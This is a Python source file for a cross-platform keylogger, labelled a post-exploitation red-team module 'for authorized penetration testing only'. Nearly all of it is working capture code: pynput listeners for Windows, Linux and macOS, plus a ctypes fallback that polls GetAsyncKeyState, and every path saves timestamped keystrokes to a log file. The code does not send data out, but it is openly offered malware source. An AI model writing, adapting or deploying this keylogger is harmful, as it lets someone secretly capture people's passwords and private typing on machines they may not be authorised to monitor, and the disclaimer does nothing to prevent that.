#!/usr/bin/env python3
"""
Keylogger - Post-Exploitation Module
Captures keystrokes on target system
For authorized penetration testing only
"""

import os
import sys
import time
import json
from datetime import datetime
import platform

class KeyLogger:
    def __init__(self, log_file='keylog.txt', interval=10):
        self.log_file = log_file
        self.interval = interval
        self.os_type = platform.system()
        self.keys_pressed = []
        
    def start(self):
        """Start keylogging based on OS"""
        print(f"[*] Starting keylogger on {self.os_type}...")
        print(f"[*] Logging to: {self.log_file}")
        print(f"[*] Save interval: {self.interval} seconds")
        
        if self.os_type == "Windows":
            self.keylog_windows()
        elif self.os_type == "Linux":
            self.keylog_linux()
        elif self.os_type == "Darwin":
            self.keylog_macos()
        else:
            print(f"[!] Keylogging not supported on {self.os_type}")
    
    def keylog_windows(self):
        """Keylogger for Windows using pynput"""
        try:
            from pynput import keyboard
            
            def on_press(key):
                try:
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    
                    if hasattr(key, 'char') and key.char is not None:
                        self.keys_pressed.append({
                            'timestamp': timestamp,
                            'key': key.char
                        })
                    else:
                        # Special keys
                        special_key = str(key).replace('Key.', '')
                        self.keys_pressed.append({
                            'timestamp': timestamp,
                            'key': f'[{special_key}]'
                        })
                except Exception as e:
                    pass
            
            def on_release(key):
                # Save periodically
                if len(self.keys_pressed) >= 50:
                    self.save_keys()
                
                # Stop on ESC key (for testing)
                if key == keyboard.Key.esc:
                    return False
            
            # Start listener
            with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
                print("[+] Keylogger active (Press ESC to stop during testing)")
                listener.join()
                
        except ImportError:
            print("[!] pynput not installed. Install with: pip install pynput")
            print("[*] Falling back to alternative method...")
            self.keylog_windows_ctypes()
    
    def keylog_windows_ctypes(self):
        """Alternative Windows keylogger using ctypes"""
        try:
            import ctypes
            from ctypes import wintypes
            
            user32 = ctypes.WinDLL('user32', use_last_error=True)
            
            # Key state constants
            VK_SHIFT = 0x10
            VK_CAPITAL = 0x14
            
            def get_key_state(vk_code):
                return user32.GetAsyncKeyState(vk_code)
            
            def get_char(vk_code):
                # Convert virtual key code to character
                keyboard_state = (ctypes.c_byte * 256)()
                user32.GetKeyboardState(keyboard_state)
                
                buffer = (ctypes.c_wchar * 5)()
                result = user32.ToUnicode(
                    vk_code, 0, keyboard_state,
                    buffer, len(buffer), 0
                )
                
                if result > 0:
                    return buffer.value
                return None
            
            print("[+] Keylogger active (Ctrl+C to stop)")
            
            last_save = time.time()
            
            while True:
                for vk_code in range(8, 256):
                    if get_key_state(vk_code) & 0x8000:
                        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        char = get_char(vk_code)
                        
                        if char:
                            self.keys_pressed.append({
                                'timestamp': timestamp,
                                'key': char
                            })
                
                # Save periodically
                if time.time() - last_save >= self.interval:
                    self.save_keys()
                    last_save = time.time()
                
                time.sleep(0.01)  # Small delay
                
        except Exception as e:
            print(f"[!] Error in Windows keylogger: {e}")
    
    def keylog_linux(self):
        """Keylogger for Linux using pynput"""
        try:
            from pynput import keyboard
            
            def on_press(key):
                try:
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    
                    if hasattr(key, 'char') and key.char is not None:
                        self.keys_pressed.append({
                            'timestamp': timestamp,
                            'key': key.char
                        })
                    else:
                        special_key = str(key).replace('Key.', '')
                        self.keys_pressed.append({
                            'timestamp': timestamp,
                            'key': f'[{special_key}]'
                        })
                        
                    # Save periodically
                    if len(self.keys_pressed) >= 50:
                        self.save_keys()
                        
                except Exception as e:
                    pass
            
            # Start listener
            with keyboard.Listener(on_press=on_press) as listener:
                print("[+] Keylogger active (Ctrl+C to stop)")
                listener.join()
                
        except ImportError:
            print("[!] pynput not installed. Install with: pip install pynput")
            print("[!] On Linux, you may need: sudo apt-get install python3-xlib")
        except Exception as e:
            print(f"[!] Error: {e}")
            print("[!] Note: Keylogging on Linux may require root privileges")
    
    def keylog_macos(self):
        """Keylogger for macOS"""
        try:
            from pynput import keyboard
            
            print("[!] Note: macOS requires accessibility permissions")
            print("[!] Go to: System Preferences -> Security & Privacy -> Privacy -> Accessibility")
            
            def on_press(key):
                try:
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    
                    if hasattr(key, 'char') and key.char is not None:
                        self.keys_pressed.append({
                            'timestamp': timestamp,
                            'key': key.char
                        })
                    else:
                        special_key = str(key).replace('Key.', '')
                        self.keys_pressed.append({
                            'timestamp': timestamp,
                            'key': f'[{special_key}]'
                        })
                    
                    if len(self.keys_pressed) >= 50:
                        self.save_keys()
                        
                except Exception as e:
                    pass
            
            with keyboard.Listener(on_press=on_press) as listener:
                print("[+] Keylogger active (Ctrl+C to stop)")
                listener.join()
                
        except ImportError:
            print("[!] pynput not installed. Install with: pip install pynput")
        except Exception as e:
            print(f"[!] Error: {e}")
    
    def save_keys(self):
        """Save captured keystrokes to file"""
        if not self.keys_pressed:
            return
        
        try:
            # Append to log file
            with open(self.log_file, 'a', encoding='utf-8') as f:
                for entry in self.keys_pressed:
                    f.write(f"{entry['timestamp']}: {entry['key']}\n")
            
            print(f"[*] Saved {len(self.keys_pressed)} keystrokes")
            self.keys_pressed = []
            
        except Exception as e:
            print(f"[!] Error saving keys: {e}")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Keylogger for authorized pentesting')
    parser.add_argument('--output', default='keylog.txt', help='Output file for keystrokes')
    parser.add_argument('--interval', type=int, default=10, help='Save interval in seconds')
    args = parser.parse_args()
    
    print("="*60)
    print("Keylogger - Red Team Tool")
    print("For Authorized Penetration Testing Only")
    print("="*60 + "\n")
    
    keylogger = KeyLogger(log_file=args.output, interval=args.interval)
    
    try:
        keylogger.start()
    except KeyboardInterrupt:
        print("\n[!] Keylogger stopped")
        keylogger.save_keys()
        print(f"[+] All keystrokes saved to: {args.output}")

if __name__ == '__main__':
    main()
